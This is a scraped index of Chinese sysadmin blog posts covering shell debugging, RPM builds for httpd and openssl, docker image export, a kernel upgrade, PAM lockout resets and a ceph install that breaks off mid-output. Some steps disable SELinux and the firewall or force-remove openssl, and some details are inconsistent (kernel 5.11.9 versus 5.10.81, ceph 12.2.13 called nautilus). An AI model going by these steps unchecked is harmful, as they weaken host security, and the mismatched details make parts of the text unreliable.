[root@lvbibir ~]# [root@lvbibir ~]# sh test.sh [root@lvbibir ~]# echo $number [root@lvbibir ~]# bash test.sh [root@lvbibir ~]# echo $number [root@lvbibir ~]# ./test.sh [root@lvbibir ~]# echo $number # source 方式可以获取脚本中的变量 [root@lvbibir ~]# source test.sh [root@lvbibir ~]# echo $number 22 [root@lvbibir ~]# 其他问题 关于是否在子 bash 环境运行的区别出了变量问题还会存在一些其他影响，如下测试\n已知目前存在一个 mysqld 进程，其 pid 为 29426 ，写一个监控pid的脚本\n[root@lvbibir ~]# cat test.sh #!/bin/bash process=$1 pid=$(ps -elf | grep $process | grep -v grep | awk \u0026#39;{print $4}\u0026#39;) echo $pid 两种方式分别运行一下\n[root@lvbibir ~]# sh test.sh mysqld 27038 27039 29426 [root@lvbibir ~]# bash test.sh mysqld 27047 27048 29426 [root@lvbibir ~]# ./test.sh mysqld 27056 27057 29426 [root@lvbibir ~]# [root@lvbibir ~]# source test.sh mysqld 29426 [root@lvbibir ~]# . test.sh mysqld 29426 [root@lvbibir ~]# 问题出现了，由于某种原因导致子 bash 环境中执行的脚本监控到多个 pid ，给脚本添加个 sleep 来看下\n[root@lvbibir ~]# cat test.sh #!/bin/bash process=$1 pid=$(ps -elf | grep $process | grep -v grep | awk \u0026#39;{print $4}\u0026#39;) echo $pid sleep 30 [root@lvbibir ~]# ./test.sh mysqld 27396 27397 29426 新开一个终端，查看进程\n输出的第一个进程号和第三个进程号对上了，第二个目前不知道是怎么产生的\n在脚本再添加个 grep 过滤掉脚本本身的进程来规避这个问题\n[root@lvbibir ~]# cat test.sh #!/bin/bash process=$1 pid=$(ps -elf | grep $process | grep -v grep | grep -v bash | awk \u0026#39;{print $4}\u0026#39;) echo $pid [root@lvbibir ~]# ./test.sh mysqld 29426 参考 https://blog.csdn.net/houxiaoni01/article/details/105161356\n","permalink":"https://www.lvbibir.cn/posts/tech/shell_different_execution_mode/","summary":"shell 脚本通常有 sh filename、bash filename、./filename、source filename 这四种执行方式 source filename 可以使用 . filename 代替，在当前的 bash","title":"shell脚本不同执行方式的区别"},{"content":"前言 bash脚本是没有debug模式的，不过可以通过 set 指令实现简单的debug功能\nbash 脚本中默认每条指令都会从上到下依次执行，但是当某行指令报错时，我们大多数情况下是不希望继续执行后续指令的\n这时可以使用 bash 脚本中 set 指令的四个参数：``-e、-u、-x、-o pipefail`\n命令报错即返回值（$?）不为0\nset -e set -e 选项可以在脚本出现异常的时候立即退出，后续命令不再执行，相当于打上了一个断点\nif 判断条件里出现异常也会直接退出，如果不希望退出可以在判断语句后面加上 || true 来阻止退出\nbefore 脚本内容\nfoo是一个不存在的命令，用于模拟命令报错\n#!/bin/bash foo echo \u0026#34;hello\u0026#34; 执行结果\n./test.sh: line 3: foo: command not found hello after 脚本内容\n#!/bin/bash set -e foo echo \u0026#34;hello\u0026#34; 执行结果\n./test.sh: line 5: foo: command not found 阻止立即退出的例子 #!/bin/bash set -e foo || true echo \u0026#34;hello\u0026#34; ./test.sh: line 5: foo: command not found hello set -o pipefail 默认情况下 bash 只会检查管道（pipelie）操作的最后一个命令的返回值，即最后一个命令返回值为 0 则判断整条管道语句是正确的\n如下\nset -o pipefail 的作用就是管道中只要有一个命令失败，则整个管道视为失败\nbefore #!/bin/bash set -e foo | echo \u0026#34;a\u0026#34; echo \u0026#34;hello\u0026#34; ./test.sh: line 5: foo: command not found a hello after #!/bin/bash set -eo pipefail foo | echo \u0026#34;a\u0026#34; echo \u0026#34;hello\u0026#34; ./test.sh: line 5: foo: command not found a set -u set -u 的作用是将所有未定义的变量视为错误，默认情况下 bash 会将未定义的变量视为空\nbefore #!/bin/bash set -eo pipefail echo $a echo \u0026#34;hello\u0026#34; hello after #!/bin/bash set -euo pipefail echo $a echo \u0026#34;hello\u0026#34; ./test.sh: line 5: a: unbound variable set -x set -x 可以让 bash 把每个命令在执行前先打印出来，好处显而易见，可以快速方便的找到出问题的脚本位置，坏处就是 bash 的 log 会格外的乱\n另外，它在打印的时候会先把变量解析出来\n纵然 log 可能会乱一些，但也比debug的时候掉头发强\n#!/bin/bash set -euox pipefail a=2 echo $a echo \u0026#34;hello\u0026#34; + a=2 + echo 2 # 这里已经将变量 a 解析为 2 了 2 + echo hello hello 参考 https://zhuanlan.zhihu.com/p/107135290\n","permalink":"https://www.lvbibir.cn/posts/tech/shell_enable_debug_mode/","summary":"前言 bash脚本是没有debug模式的，不过可以通过 set 指令实现简单的debug功能 bash 脚本中默认每条指令都会从上到下依次执行，但是当某行指令报","title":"shell脚本开启debug模式"},{"content":"前言 仅在win10测试可用\n在工作中需要连接公司内网（有线，不可联网），访问外网时需要连接无线\n同时接入这两个网络时，内网访问正常，外网无法访问。\n此时可以通过调整网络优先级及配置路由实现内外网同时访问\n一般来说，内网的网段数量较少，我们可以配置使默认路由走外网，走内网时通过配置的路由走\n调整网络优先级 查看默认路由\nroute print 0.0.0.0 这两个路由分别是内网和外网的默认路由，绝大部分情况网络都是走的默认路由，但这里有两条默认路由，默认路由的优先级是按照跃点数的多少决定的，跃点数越少，优先级越高\n通过tracert命令测试下\n此时访问外网默认走内网网卡，自然是不通的。\n将外网无线的跃点数调小点再试试\nroute print可以看到跃点数修改成功了，此时外网无线的跃点数更小，优先级更高\ntracert\u0026amp;ping再试一下\n配置路由 配置路由需要以管理员权限运行powershell或者cmd\n配置路由后，内网访问也没有问题了\nroute add 172.16.2.0 mask 255.255.255.0 172.30.4.254 metric 3 route add 172.16.3.0 mask 255.255.255.0 172.30.4.254 metric 3 route add 172.16.4.0 mask 255.255.255.0 172.30.4.254 metric 3 这里配置的路由重启系统后会消失，加 -p选项设置为永久路由\nroute add -p 172.16.2.0 mask 255.255.255.0 172.30.4.254 metric 3 ","permalink":"https://www.lvbibir.cn/posts/tech/windows_network_priority/","summary":"前言 仅在win10测试可用 在工作中需要连接公司内网（有线，不可联网），访问外网时需要连接无线 同时接入这两个网络时，内网访问正常，外网无法访问","title":"windows双网卡时设置网络优先级"},{"content":"系统版本：isoft-serveros-v4.2（centos7）\n源码下载链接：\nhttps://dlcdn.apache.org//apr/apr-1.7.0.tar.bz2\nhttps://dlcdn.apache.org//apr/apr-util-1.6.1.tar.bz2\nhttps://dlcdn.apache.org//httpd/httpd-2.4.52.tar.bz2\n安装依赖\nyum install -y wget gcc rpm-build yum install -y autoconf zlib-devel libselinux-devel libuuid-devel apr-devel apr-util-devel pcre-devel openldap-devel lua-devel libxml2-devel openssl-devel yum install -y libtool doxygen yum install -y postgresql-devel mysql-devel sqlite-devel unixODBC-devel nss-devel libdb4-devel依赖需要使用epel源安装，这里使用阿里的epel源\n# 添加阿里yum源 wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo # 手动修改repo文件中的系统版本，因为本系统检测到的版本号是4 sed -i \u0026#39;s/$releasever/7/g\u0026#39; /etc/yum.repos.d/CentOS-Base.repo # 安装epel源 yum install -y epel-release # 安装libdb4-devel yum install -y libdb4-devel 编译准备\n[root@localhost ~]# mkdir -p /root/rpmbuild/{SPECS,SOURCES} [root@localhost ~]# cd /root/rpmbuild/SOURCES/ [root@localhost SOURCES]# wget --no-check-certificate https://dlcdn.apache.org//apr/apr-util-1.6.1.tar.bz2 [root@localhost SOURCES]# tar jxf apr-1.7.0.tar.bz2 [root@localhost SOURCES]# tar jxf apr-util-1.6.1.tar.bz2 [root@localhost SOURCES]# tar jxf httpd-2.4.52.tar.bz2 [root@localhost SOURCES]# cp apr-1.7.0/apr.spec ../SPECS/ [root@localhost SOURCES]# cp apr-util-1.6.1/apr-util.spec ../SPECS/ [root@localhost SOURCES]# cp httpd-2.4.52/httpd.spec ../SPECS/ 开始编译\n[root@localhost SOURCES]# cd ../SPECS/ # 修改spec文件 [root@localhost SPECS]# vim apr.spec Release: 1%dist [root@localhost SPECS]# vim apr-util.spec Release: 1%dist [root@localhost SPECS]# vim httpd.spec Release: 1%dist [root@localhost SPECS]# rpmbuild -ba apr.spec [root@localhost SPECS]# rpm -Uvh /root/rpmbuild/RPMS/x86_64/apr-* [root@localhost SPECS]# rpmbuild -ba apr-util.spec [root@localhost SPECS]# rpm -Uvh /root/rpmbuild/RPMS/x86_64/apr-util-* [root@localhost SPECS]# rpmbuild -ba httpd.spec [root@localhost SPECS]# rpm -Uvh /root/rpmbuild/RPMS/x86_64/httpd-* [root@localhost SPECS]# rpm -Uvh /root/rpmbuild/RPMS/x86_64/mod_* # 打包所有的软件包 [root@localhost ~]# tar zcf httpd-2.4.25.tar.gz x86_64/ 这里修改%dist是为了修改编译后生成的软件包的名字，dist具体代表什么可以在/etc/rpm/macros.dist文件中看到\n","permalink":"https://www.lvbibir.cn/posts/tech/httpd_src_build_rpm/","summary":"系统版本：isoft-serveros-v4.2（centos7） 源码下载链接： https://dlcdn.apache.org//apr/apr-1.7.0.tar.bz2 https://dlcdn.apache.org//apr/apr-util-1.6.1.tar.bz2 https://dlcdn.apache.org//httpd/httpd-2.4.52.tar.bz2 安装依赖 yum install -y wget gcc rpm-build yum install -y autoconf zlib-devel libselinux-devel libuuid-devel apr-devel apr-util-devel pcre-devel openldap-devel lua-devel libxml2-devel openssl-devel yum install -y","title":"httpd源码构建rpm"},{"content":"环境 iSoftserver-v4.2(Centos-7)\nopenssl version：1.0.2k\n编译 从github上看到的编译脚本，本地修改后：\n#!/bin/bash set -e set -v mkdir ~/openssl \u0026amp;\u0026amp; cd ~/openssl yum -y install \\ curl \\ which \\ make \\ gcc \\ perl \\ perl-WWW-Curl \\ rpm-build # Get openssl tarball cp /root/openssl-1.1.1m.tar.gz ./ # SPEC file cat \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; \u0026gt; ~/openssl/openssl.spec Summary: OpenSSL 1.1.1m for Centos Name: openssl Version: %{?version}%{!?version:1.1.1m} Release: 1%{?dist} Obsoletes: %{name} \u0026lt;= %{version} Provides: %{name} = %{version} URL: https://www.openssl.org/ License: GPLv2+ Source: https://www.openssl.org/source/%{name}-%{version}.tar.gz BuildRequires: make gcc perl perl-WWW-Curl BuildRoot: %{_tmppath}/%{name}-%{version}-%{release}-root %global openssldir /usr/openssl %description OpenSSL RPM for version 1.1.1m on Centos %package devel Summary: Development files for programs which will use the openssl library Group: Development/Libraries Requires: %{name} = %{version}-%{release} %description devel OpenSSL RPM for version 1.1.1m on Centos (development package) %prep %setup -q %build ./config --prefix=%{openssldir} --openssldir=%{openssldir} make %install [ \u0026#34;%{buildroot}\u0026#34; != \u0026#34;/\u0026#34; ] \u0026amp;\u0026amp; %{__rm} -rf %{buildroot} %make_install mkdir -p %{buildroot}%{_bindir} mkdir -p %{buildroot}%{_libdir} ln -sf %{openssldir}/lib/libssl.so.1.1 %{buildroot}%{_libdir} ln -sf %{openssldir}/lib/libcrypto.so.1.1 %{buildroot}%{_libdir} ln -sf %{openssldir}/bin/openssl %{buildroot}%{_bindir} %clean [ \u0026#34;%{buildroot}\u0026#34; != \u0026#34;/\u0026#34; ] \u0026amp;\u0026amp; %{__rm} -rf %{buildroot} %files %{openssldir} %defattr(-,root,root) /usr/bin/openssl /usr/lib64/libcrypto.so.1.1 /usr/lib64/libssl.so.1.1 %files devel %{openssldir}/include/* %defattr(-,root,root) %post -p /sbin/ldconfig %postun -p /sbin/ldconfig EOF mkdir -p /root/rpmbuild/{BUILD,RPMS,SOURCES,SPECS,SRPMS} cp ~/openssl/openssl.spec /root/rpmbuild/SPECS/openssl.spec mv openssl-1.1.1m.tar.gz /root/rpmbuild/SOURCES cd /root/rpmbuild/SPECS \u0026amp;\u0026amp; \\ rpmbuild \\ -D \u0026#34;version 1.1.1m\u0026#34; \\ -ba openssl.spec # Before Uninstall Openssl : rpm -qa openssl # Uninstall Current Openssl Vesion : yum -y remove openssl # For install: rpm -ivvh /root/rpmbuild/RPMS/x86_64/openssl-1.1.1m-1.el7.x86_64.rpm --nodeps # Verify install: rpm -qa openssl # openssl version 运行脚本\nchmod 755 install_openssl-1.1.1m.sh ./isntall_openssl-1.1.1m.sh tree rpmbuild/*RPMS 升级 rpm -e openssl --nodeps rpm -ivh openssl-1.1.1m-1.el7.isoft.x86_64.rpm --nodeps openssl version ","permalink":"https://www.lvbibir.cn/posts/tech/openssl_src_build_rpm/","summary":"环境 iSoftserver-v4.2(Centos-7) openssl version：1.0.2k 编译 从github上看到的编译脚本，本地修改后： #!/bin/bash set -e set -v mkdir ~/openssl \u0026amp;\u0026amp; cd ~/openssl yum -y install \\ curl \\ which \\ make \\ gcc \\ perl \\ perl-WWW-Curl \\ rpm-build #","title":"openssl源码构建rpm"},{"content":"前言 在使用kolla-ansible部署多节点openstack时，所有节点的外网网卡名称和管理网卡名称需要一样，其中两台是型号相同的物理机，网卡名无需变动，第三台是虚拟机，默认是ens*形式的网卡，需要改成enp*s*f*的格式\n修改配置文件 vim /etc/sysconfig/network-scripts/ifcfg-ens32 配置网络规则命名文件 vim /etc/udev/rules.d/70-persistent-ipoib.rules # 添加如下行，mac地址自行修改 SUBSYSTEM==\u0026#34;net\u0026#34;, ACTION==\u0026#34;add\u0026#34;, DRIVERS==\u0026#34;?*\u0026#34;, ATTR{address}==\u0026#34;00:0c:29:bc:1e:01\u0026#34;, ATTR{type}==\u0026#34;1\u0026#34;, KERNEL==\u0026#34;eth*\u0026#34;, NAME=\u0026#34;enp11s0f0\u0026#34; 配置grub并重启 vim /etc/default/grub # 修改如下行 GRUB_CMDLINE_LINUX=\u0026#34;crashkernel=auto rd.lvm.lv=centos/root net.ifnames=0 rd.lvm.lv=centos/swap rhgb quiet\u0026#34; grub2-mkconfig -o /boot/grub2/grub.cfg 之后直接reboot重启系统\n参考 https://www.xmodulo.com/change-network-interface-name-centos7.html\n","permalink":"https://www.lvbibir.cn/posts/tech/centos7_change_network_card_name/","summary":"前言 在使用kolla-ansible部署多节点openstack时，所有节点的外网网卡名称和管理网卡名称需要一样，其中两台是型号相同的物理机","title":"centos7修改网卡名称"},{"content":"pg_num 用此命令创建存储池时：\nceph osd pool create {pool-name} pg_num 确定pg_num取值是强制性的，因为不能自动计算。常用的较为通用的取值：\n少于5个osd，pg_num设置为128 osd数量在 5 到 10 个时，pg_num设置为512 osd数量在 10 到 50 个时，pg_num = 4096 osd数量大于50是，需要理解ceph的权衡算法，自己计算pg_num取值 自行计算pg_num取值时可使用ceph配套的pg_num取值工具 pgcalc（https://old.ceph.com/pgcalc/） 参考 https://www.cnblogs.com/varden/p/13921172.html\n","permalink":"https://www.lvbibir.cn/posts/tech/ceph_pg_num_config_create_pool/","summary":"pg_num 用此命令创建存储池时： ceph osd pool create {pool-name} pg_num 确定pg_num取值是强制性的，因为不能自动计算。常用的较为通用的取值： 少于5个osd，pg_num设置","title":"ceph创建pool时pg_num的配置"},{"content":"python方式 批量导出，运行后所有tar包都在当前目录下\n# encoding: utf-8 import re import os import subprocess if __name__ == \u0026#34;__main__\u0026#34;: p = subprocess.Popen(\u0026#39;docker images\u0026#39;, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) for line in p.stdout.readlines(): # 此处的正则表达式是为了匹配镜像名以kolla为开头的镜像 # 实际使用中根据需要自行调整 m = re.match(r\u0026#39;(^kolla[^\\s]*\\s*)\\s([^\\s]*\\s)\u0026#39;, line) if not m: continue # 镜像名 iname = m.group(1).strip() # tag itag = m.group(2).strip() # tar包的名字 if iname.find(\u0026#39;/\u0026#39;): tarname = iname.split(\u0026#39;/\u0026#39;)[0] + \u0026#39;_\u0026#39; + iname.split(\u0026#39;/\u0026#39;)[-1] + \u0026#39;_\u0026#39; + itag + \u0026#39;.tar\u0026#39; else: tarname = iname + \u0026#39;_\u0026#39; + itag + \u0026#39;.tar\u0026#39; print tarname ifull = iname + \u0026#39;:\u0026#39; + itag #save cmd = \u0026#39;docker save -o \u0026#39; + tarname + \u0026#39; \u0026#39; + ifull print os.system(cmd) retval = p.wait() 批量导入，同理导入当前目录下的所有的tar包\nimport os images = os.listdir(os.getcwd()) for imagename in images: if imagename.endswith(\u0026#39;.tar\u0026#39;): print(imagename) os.system(\u0026#39;docker load -i %s\u0026#39;%imagename) bash方式 导出 #!/bin/bash docker images \u0026gt; images.txt awk \u0026#39;{print $1}\u0026#39; images.txt \u0026gt; images_cut.txt sed -i \u0026#39;1d\u0026#39; images_cut.txt while read LINE do docker save $LINE \u0026gt; ${LINE//\\//_}.train.tar echo ok done \u0026lt; images_cut.txt echo finish 导入 #!/bin/bash while read LINE do docker load -i $LINE echo ok done \u0026lt; tarname.txt echo finish 参考 https://www.cnblogs.com/ksir16/p/8865525.html\n","permalink":"https://www.lvbibir.cn/posts/tech/import_export_docker_image/","summary":"python方式 批量导出，运行后所有tar包都在当前目录下 # encoding: utf-8 import re import os import subprocess if __name__ == \u0026#34;__main__\u0026#34;: p = subprocess.Popen(\u0026#39;docker images\u0026#39;, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) for line in p.stdout.readlines(): # 此处的正则表达式是为了匹配镜像名","title":"批量导出\u0026导入docker镜像"},{"content":"查看内核版本\n[dpl@test1 ~]$ cat /etc/redhat-release Red Hat Enterprise Linux Server release 7.5 (Maipo)\n下载内核\nhttps://elrepo.org/linux/kernel/el7/x86_64/RPMS/ 下载自己所需的内核 更新版本：5.10.81\n内核版本介绍：\nlt longterm的缩写 长期维护版 ml mainline的缩写 最新稳定版 使用wget命令下载内核RPM包\n[dpl@test1 ~]# wget https://dl.lamp.sh/kernel/el7/kernel-ml-5.10.81-1.el7.x86_64.rpm [dpl@test1 ~]# wget https://dl.lamp.sh/kernel/el7/kernel-ml-devel-5.10.81-1.el7.x86_64.rpm 安装内核\nyum localinstall -y kernel-ml-5.10.81-1.el7.x86_64.rpm kernel-ml-devel-5.10.81-1.el7.x86_64.rpm 查看所有可用内核启动项\n[dpl@test1 ~] awk -F' \u0026lsquo;$1==\u0026ldquo;menuentry \u0026quot; {print i++ \u0026quot; : \u0026quot; $2}\u0026rsquo; /etc/grub2.cfg 0 : CentOS Linux (5.10.81-1.el7.x86_64) 7 (Core) 1 : CentOS Linux (3.10.0-1160.21.1.el7.x86_64) 7 (Core) 2 : CentOS Linux (3.10.0-957.el7.x86_64) 7 (Core) 3 : CentOS Linux (0-rescue-9a4efd5deb094f5d8a9a259066ff4f3d) 7 (Core)\n记下5.11.9内核前面的序号，修改启动项需要\n修改默认启动项\n默认启动项由/etc/default/grub中的GRUB_DEFAULT控制，如果GRUB_DEFAULT=saved，则该参数将存在/boot/grub2/grubenv\n输入grub2-editenv list命令查看默认启动项\n[root@localhost ~]# grub2-editenv list saved_entry=CentOS Linux (3.10.0-1060.el7.x86_64) 7 (Core)\n输入grub2-set-default命令修改默认启动项，0表示5.11.9内核的序号\n[dpl@test1 ~]# grub2-set-default 0\n再次查看默认启动项，发现默认启动项已经改成了0\n10.81-1.el7.elrepo.x86_64\n[dpl@test1 ~]# uname -r 5.10.81-1.el7.elrepo.x86_64\n参考：https://blog.csdn.net/cqchengdan/article/details/106031823\n","permalink":"https://www.lvbibir.cn/posts/tech/centos7_update_kernel_to_5.10/","summary":"查看内核版本 [dpl@test1 ~]$ cat /etc/redhat-release Red Hat Enterprise Linux Server release 7.5 (Maipo) 下载内核 https://elrepo.org/linux/kernel/el7/x86_64/RPMS/ 下载自己所需的内核 更新版本：5.10.81 内核版本介绍： lt longterm的缩写 长期维护版 ml m","title":"Centos7.5升级内核至5.10"},{"content":"pam模块 pam：Pluggable Authentication Modules 可插拔的认证模块，linux 中的认证方式，“可插拔的“说明可以按需对认证内容进行变更。与nsswitch一样，也是一个通用框架。只不过是提供认证功能的。\n重置密码失败次数 pam_tally2 -r -u root ## 或者 ## faillock --user root --reset 具体取决于在规则文件中使用的是 pam_faillock.so 模块还是 pam_tally2.so 模块\n例：\nvim /etc/pam.d/system-auth ","permalink":"https://www.lvbibir.cn/posts/tech/centos_too_many_password_attempts/","summary":"pam模块 pam：Pluggable Authentication Modules 可插拔的认证模块，linux 中的认证方式，“可插拔的“说明可以按需对认证内容进行变更。与nsswit","title":"CentOS密码尝试次数过多"},{"content":"前言 基于CVE-1999-0526漏洞的披露，对系统X服务的6000端口进行关闭\n有三种方式：\n修改系统/usr/bin/X内容，增加nolisten参数 开启系统防火墙，关闭6000端口的对外访问 禁用桌面(runlevel-5)，开机进入字符界面(runlevel-3) 修改/usr/bin/X脚本 关闭 rm -f /usr/bin/X vim /usr/bin/X ################### 添加如下内容 #!/bin/bash exec /usr/bin/Xorg \u0026#34;$@\u0026#34; -nolisten tcp exit 0 #################### chmod 777 /usr/bin/X kill -9 进程号 # ps -elf |grep X 显示的进程号 恢复 rm -f /usr/bin/X ln -s /usr/bin/Xorg /usr/bin/X kill -9 进程号 # pe -elf | grep Xorg 显示的进程号 在测试过程中出现过杀死X服务进程后没有自启的情况，可尝试使用 init 3 \u0026amp;\u0026amp; init 5 尝试重新启动X服务\n修改防火墙方式 # 开启除6000端口以外的所有端口(6000端口无法访问) systemctl start firewalld firewall-cmd --permanent --zone=public --add-port=1-65535/udp firewall-cmd --permanent --zone=public --add-port=1-5999/tcp firewall-cmd --permanent --zone=public --add-port=6001-65535/tcp firewall-cmd --reload firewall-cmd --list-all # 恢复（6000端口可以访问） firewall-cmd --permanent --zone=public --add-port=6000/tcp firewall-cmd --reload firewall-cmd --list-all 参考 https://bugzilla.redhat.com/show_bug.cgi?id=1647621\n","permalink":"https://www.lvbibir.cn/posts/tech/close_6000_port/","summary":"前言 基于CVE-1999-0526漏洞的披露，对系统X服务的6000端口进行关闭 有三种方式： 修改系统/usr/bin/X内容，增加nolis","title":"关闭X服务本地监听的6000端口"},{"content":"前言 ceph测试环境的搭建\n基本环境 物理环境：Vmware Workstaion 系统版本：Centos-7.9-Minimal 两个osd节点添加一块虚拟磁盘，建议不小于20G ip hostname services 192.168.150.101 ceph-admin(ceph-deploy) mds1、mon1、mon_mgr、ntp-server 192.168.150.102 ceph-node1 osd1 192.168.150.103 ceph-node2 osd2 前期配置 以下操作所有节点都需执行\n修改主机名\nhostnamectl set-hostname ceph-admin bash hostnamectl set-hostname ceph-node1 bash hostnamectl set-hostname ceph-node2 bash 修改hosts文件\nvim /etc/hosts 192.168.150.101 ceph-admin 192.168.150.102 ceph-node1 192.168.150.103 ceph-node2 关闭防火墙和selinux、修改yum源及安装一些常用工具\n这里提供了一个简单的系统初始化脚本用来做上述操作，适用于Centos7\nchmod 777 init.sh ./init.sh #!/bin/bash echo \u0026#34;========start=============\u0026#34; sed -i \u0026#39;/SELINUX/s/enforcing/disabled/\u0026#39; /etc/sysconfig/selinux setenforce 0 iptables -F systemctl disable firewalld systemctl stop firewalld echo \u0026#34;====dowload wget=========\u0026#34; yum install -y wget echo \u0026#34;====backup repo===========\u0026#34; mkdir /etc/yum.repos.d/bak mv /etc/yum.repos.d/*.repo /etc/yum.repos.d/bak/ echo \u0026#34;====dowload aliyum-repo====\u0026#34; wget http://mirrors.aliyun.com/repo/Centos-7.repo -O /etc/yum.repos.d/Centos-Base.repo wget http://mirrors.aliyun.com/repo/epel-7.repo -O /etc/yum.repos.d/epel.repo echo \u0026#34;====upgrade yum============\u0026#34; yum clean all yum makecache fast echo \u0026#34;====dowload tools=========\u0026#34; yum install -y net-tools vim bash-completion echo \u0026#34;=========finish============\u0026#34; 每个节点安装和配置NTP（官方推荐的是集群的所有节点全部安装并配置 NTP，需要保证各节点的系统时间一致。没有自己部署ntp服务器，就在线同步NTP）\nyum install chrony -y systemctl start chronyd systemctl enable chronyd ceph-admin\nvim /etc/chrony.conf systemctl restart chronyd chronyc sources 这里使用阿里云的ntp服务器\nceph-node1、ceph-node2\nvim /etc/chrony.conf systemctl restart chronyd chronyc sources 这里指定ceph-admin节点的ip即可\n添加ceph源\nyum -y install epel-release rpm --import http://mirrors.163.com/ceph/keys/release.asc rpm -Uvh --replacepkgs http://mirrors.163.com/ceph/rpm-nautilus/el7/noarch/ceph-release-1-1.el7.noarch.rpm [Ceph] name=Ceph packages for $basearch baseurl=http://download.ceph.com/rpm-nautilus/el7/$basearch enabled=1 gpgcheck=1 type=rpm-md gpgkey=https://download.ceph.com/keys/release.asc [Ceph-noarch] name=Ceph noarch packages baseurl=http://download.ceph.com/rpm-nautilus/el7/noarch enabled=1 gpgcheck=1 type=rpm-md gpgkey=https://download.ceph.com/keys/release.asc [ceph-source] name=Ceph source packages baseurl=http://download.ceph.com/rpm-nautilus/el7/SRPMS enabled=1 gpgcheck=1 type=rpm-md gpgkey=https://download.ceph.com/keys/release.asc 磁盘准备 以下操作在osd节点（ceph-node1、ceph-node2）执行\n# 检查磁盘 [root@ceph-node1 ~]# fdisk -l /dev/sdb Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes # 格式化磁盘 [root@ceph-node1 ~]# parted -s /dev/sdb mklabel gpt mkpart primary xfs 0% 100% [root@ceph-node1 ~]# mkfs.xfs /dev/sdb -f meta-data=/dev/sdb isize=512 agcount=4, agsize=1310720 blks = sectsz=512 attr=2, projid32bit=1 = crc=1 finobt=0, sparse=0 data = bsize=4096 blocks=5242880, imaxpct=25 = sunit=0 swidth=0 blks naming =version 2 bsize=4096 ascii-ci=0 ftype=1 log =internal log bsize=4096 blocks=2560, version=2 = sectsz=512 sunit=0 blks, lazy-count=1 realtime =none extsz=4096 blocks=0, rtextents=0 查看磁盘格式 [root@ceph-node1 ~]# blkid -o value -s TYPE /dev/sdb xfs 安装ceph集群 配置ssh免密\n[root@ceph-admin ~]# ssh-keygen # 一路回车 [root@ceph-admin ~]# ssh-copy-id root@ceph-node1 [root@ceph-admin ~]# ssh-copy-id root@ceph-node2 安装ceph-deploy\n[root@ceph-admin ~]# yum install -y python2-pip [root@ceph-admin ~]# yum install -y ceph-deploy 创建文件夹用户存放集群文件\n[root@ceph-admin ~]# mkdir /root/my-ceph [root@ceph-admin ~]# cd /root/my-ceph/ 创建集群（后面填写monit节点的主机名，这里monit节点和管理节点是同一台机器，即ceph-admin）\n[root@ceph-admin my-ceph]# ceph-deploy new ceph-admin [ceph_deploy.conf][DEBUG ] found configuration file at: /root/.cephdeploy.conf [ceph_deploy.cli][INFO ] Invoked (2.0.1): /usr/bin/ceph-deploy new ceph-admin [ceph_deploy.cli][INFO ] ceph-deploy options: [ceph_deploy.cli][INFO ] username : None [ceph_deploy.cli][INFO ] func : \u0026lt;function new at 0x7f2217df3de8\u0026gt; [ceph_deploy.cli][INFO ] verbose : False [ceph_deploy.cli][INFO ] overwrite_conf : False [ceph_deploy.cli][INFO ] quiet : False [ceph_deploy.cli][INFO ] cd_conf : \u0026lt;ceph_deploy.conf.cephdeploy.Conf instance at 0x7f221756e4d0\u0026gt; [ceph_deploy.cli][INFO ] cluster : ceph [ceph_deploy.cli][INFO ] ssh_copykey : True [ceph_deploy.cli][INFO ] mon : [\u0026#39;ceph-admin\u0026#39;] [ceph_deploy.cli][INFO ] public_network : None [ceph_deploy.cli][INFO ] ceph_conf : None [ceph_deploy.cli][INFO ] cluster_network : None [ceph_deploy.cli][INFO ] default_release : False [ceph_deploy.cli][INFO ] fsid : None [ceph_deploy.new][DEBUG ] Creating new cluster named ceph [ceph_deploy.new][INFO ] making sure passwordless SSH succeeds [ceph-admin][DEBUG ] connected to host: ceph-admin [ceph-admin][DEBUG ] detect platform information from remote host [ceph-admin][DEBUG ] detect machine type [ceph-admin][DEBUG ] find the location of an executable [ceph-admin][INFO ] Running command: /usr/sbin/ip link show [ceph-admin][INFO ] Running command: /usr/sbin/ip addr show [ceph-admin][DEBUG ] IP addresses found: [u\u0026#39;192.168.150.101\u0026#39;] [ceph_deploy.new][DEBUG ] Resolving host ceph-admin [ceph_deploy.new][DEBUG ] Monitor ceph-admin at 192.168.150.101 [ceph_deploy.new][DEBUG ] Monitor initial members are [\u0026#39;ceph-admin\u0026#39;] [ceph_deploy.new][DEBUG ] Monitor addrs are [\u0026#39;192.168.150.101\u0026#39;] [ceph_deploy.new][DEBUG ] Creating a random mon key... [ceph_deploy.new][DEBUG ] Writing monitor keyring to ceph.mon.keyring... [ceph_deploy.new][DEBUG ] Writing initial config to ceph.conf... 修改集群配置文件\n注意：mon_host必须和public network 网络是同网段内\n[root@ceph-admin my-ceph]# vim ceph.conf # 添加如下两行内容 ...... public_network = 192.168.150.0/24 osd_pool_default_size = 2 开始安装\n[root@ceph-admin my-ceph]# ceph-deploy install --release nautilus ceph-admin ceph-node1 ceph-node2 # 出现以下提示说明安装成功 [ceph-node2][DEBUG ] Complete! [ceph-node2][INFO ] Running command: ceph --version [ceph-node2][DEBUG ] ceph version 12.2.13 (584a20eb0237c657dc0567da126be145106aa47e) nautilus (stable) 初始化monit监控节点，并收集所有密钥\n[root@ceph-admin my-ceph]# ceph-deploy mon create-initial [root@ceph-admin my-ceph]# ceph-deploy gatherkeys ceph-admin 检查OSD节点上所有可用的磁盘\n[root@ceph-admin my-ceph]# ceph-deploy disk list ceph-node1 ceph-node2 删除所有osd节点上的分区、准备osd及激活osd\n主机上有多块磁盘要作为osd时：ceph-deploy osd create ceph-node21 --data /dev/sdb --data /dev/sdc\n[root@ceph-admin my-ceph]# ceph-deploy osd create ceph-node1 --data /dev/sdb [root@ceph-admin my-ceph]# ceph-deploy osd create ceph-node2 --data /dev/sdb 在两个osd节点上通过命令已显示磁盘已成功mount\n[root@ceph-node1 ~]# lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 20G 0 disk ├─sda1 8:1 0 1G 0 part /boot └─sda2 8:2 0 19G 0 part ├─centos-root 253:0 0 17G 0 lvm / └─centos-swap 253:1 0 2G 0 